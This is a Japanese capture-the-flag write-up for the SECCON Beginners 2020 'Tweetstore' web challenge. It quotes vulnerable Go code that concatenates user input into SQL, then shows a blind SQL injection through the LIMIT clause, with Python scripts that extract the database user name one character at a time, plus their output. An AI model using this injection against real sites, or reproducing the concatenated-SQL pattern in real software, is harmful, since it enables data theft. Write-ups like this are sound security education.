# Tweetstore
```
point:150 Easy

Search your flag!
Server: https://tweetstore.quals.beginners.seccon.jp/
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/82901614-26eb7800-9f99-11ea-97b3-1a0c6be7b8e6.png)

問題のurlに移動すると以上のようにctf4bのツイートを検索できるサイトのようです。

問題のソースコードを開いてみるとgoで書かれていました。`webserver.go`

ソースコードより以下の部分にflagがあることがわかります。

```go
func initialize() {
	var err error

	dbname := "ctf"
	dbuser := os.Getenv("FLAG")
	dbpass := "password"

	connInfo := fmt.Sprintf("port=%d host=%s user=%s password=%s dbname=%s sslmode=disable", 5432, "db", dbuser, dbpass, dbname)
	db, err = sql.Open("postgres", connInfo)
	if err != nil {
		log.Fatal(err)
	}
}
```

`dbuser`にflagが入っていることがわかるのでどうにかしてこれを表示させなければなりません。

<br>

次にパラメータを見てみます。

`https://tweetstore.quals.beginners.seccon.jp/?search=&limit=#`

urlを見る通り、`search`と`limit`が入力パラメータになっているようです。

ソースコードでは以下の部分に処理があります。

```go
var sql = "select url, text, tweeted_at from tweets"

search, ok := r.URL.Query()["search"]
if ok {
    sql += " where text like '%" + strings.Replace(search[0], "'", "\\'", -1) + "%'"
}

sql += " order by tweeted_at desc"

limit, ok := r.URL.Query()["limit"]
if ok && (limit[0] != "") {
    sql += " limit " + strings.Split(limit[0], ";")[0]
}
```

DBは以下に書いてある通り`PostgreSQL`というを使われているそうです。

`db, err = sql.Open("postgres", connInfo)`

<br>

ここで注目するのは各if文の中身になります・

searchでは`'`が含まれると`\\'`に変換されてエスケープされています。

このことより、SQLiは難しそうです。

limitでは`;`がエスケープされています。

なので`;`での複数の文を連結させることは無理ですが、`'`や`--`はエスケープされていません。

なのでlimit句を利用してflagができそうです。

あと、ブラウザからは数字のみしか入力出来ないけど、直接クエリに入力は出来た。(ノーチェック状態)

<br>

`PostgreSQL ユーザ情報参照`とネット検索すると`pg_userテーブル`があるそうです。

そしてDBのユーザー名は`current_user`で出してくれるそうです。

なので`current_user`が有効に使えそうです。

<br>

limit句では`limit sql injection`のような攻撃もあるそうです。

内容的にはlimit句で`Blind SQL Injection`が行えることでした。

limit句でascii(substr((select user), 1, 1));-- のような形で表示件数を絞り，その件数から1文字ずつフラグを特定できる

試しにlimit句でSQLを挿入してエラーが出ないか確かめてみます。

`(SELECT count(*) FROM current_user)`

![2](https://user-images.githubusercontent.com/47602064/83126922-786c4200-a114-11ea-9ca7-1e425f62b9b4.png)

すると1件だけ表示がされて`current_user`にBlind SQLiが使えそうだとわかりました。

<br>

今回のflagの初めの文字は`c`だと予測されます。

`c`のasciiコードは`99`なのでlimit句でflagの初めの文字で検索数が99になれば、探せていることがわかります。

要するに、始めの文字をasciiコードにしてそれを検索数としてわかるようにしているのです。

limit句に`ascii(substr(current_user,1,1))`を入力してみます。

これはDBのユーザ名の始めの1文字目を1文字抜き取り、その文字をasciiコードに変換させるてその数字分が検索数になるはずです。

`ascii(substr(current_user,2,1))`だとユーザ名の始めの2文字目を1文字抜き取る命令になります。

![4](https://user-images.githubusercontent.com/47602064/83204487-f0735000-a186-11ea-99d3-babde3313d9a.png)

![5](https://user-images.githubusercontent.com/47602064/83204539-0e40b500-a187-11ea-9d00-a22bba9ecbf2.png)

すると以上のようになり、検索数を見てみると

1文字目が`99`なので`c`、2文字目が`116`なので`t`ということがわかりました。

flagは`ctf4b{ }`という形なのはわかっているので上手くBlind SQLiが出来ていこともわかります。

ですが、一文字ずつ探し当ててやるのは非効率なのでpythonで実行させます。

```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-

#ctf4b2020-web-Tweetstore

import requests

URL = "https://tweetstore.quals.beginners.seccon.jp/"
flag = ""

for i in range(40):
    r = requests.get(
        URL,
        params = {
            "search":"",
            "limit":"ascii(substr(current_user,{},1))".format(len(flag)+1)
        },
    )
    count = r.text.count("Watch@Twitter")
    flag += chr(count)
    if('}' != chr(count)):
     print(flag)
    else:
     break

print()
print('FLAG: ' + flag)
```

asciiコードで一文字ずつ探していき、`}`が見つかれば探すのを終了するプログラムです。

<br><br>

でもアルファベットは全部で48個あるのは変わらないので効率よく探すために48を引いた数で探して最後にasciiコードから文字に戻す時に48を足せば

少なく実行することが出来ます。

なのでプログラムを以下のように少し変えてやれば、さらに効率が良くなります。

```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-

#ctf4b2020-web-Tweetstore

import requests

URL = "https://tweetstore.quals.beginners.seccon.jp/"
flag = ""

for i in range(40):
    r = requests.get(
        URL,
        params = {
            "search":"",
            "limit":"ascii(substr(current_user,{},1))-48".format(len(flag)+1)
        },
    )
    count = r.text.count("Watch@Twitter")
    flag += chr(count + 48)
    if('}' != chr(count + 48)):
     print(flag)
    else:
     break

print()
print('FLAG: ' + flag)
```

これを以下のように実行するとflagが表示されました。


<br>

```
$ python3 solve.py 
c
ct
ctf
ctf4
ctf4b
ctf4b{
ctf4b{i
ctf4b{is
ctf4b{is_
ctf4b{is_p
ctf4b{is_po
ctf4b{is_pos
ctf4b{is_post
ctf4b{is_postg
ctf4b{is_postgr
ctf4b{is_postgre
ctf4b{is_postgres
ctf4b{is_postgres_
ctf4b{is_postgres_y
ctf4b{is_postgres_yo
ctf4b{is_postgres_you
ctf4b{is_postgres_your
ctf4b{is_postgres_your_
ctf4b{is_postgres_your_f
ctf4b{is_postgres_your_fr
ctf4b{is_postgres_your_fri
ctf4b{is_postgres_your_frie
ctf4b{is_postgres_your_frien
ctf4b{is_postgres_your_friend
ctf4b{is_postgres_your_friend?

FLAG: ctf4b{is_postgres_your_friend?}
```

<br><br>

実際にサイトから攻撃すると以下のように表示されます。

![6](https://user-images.githubusercontent.com/47602064/82901526-08857c80-9f99-11ea-9f09-418aed97d497.png)

<br><br>

## FLAG: ctf4b{is_postgres_your_friend?}
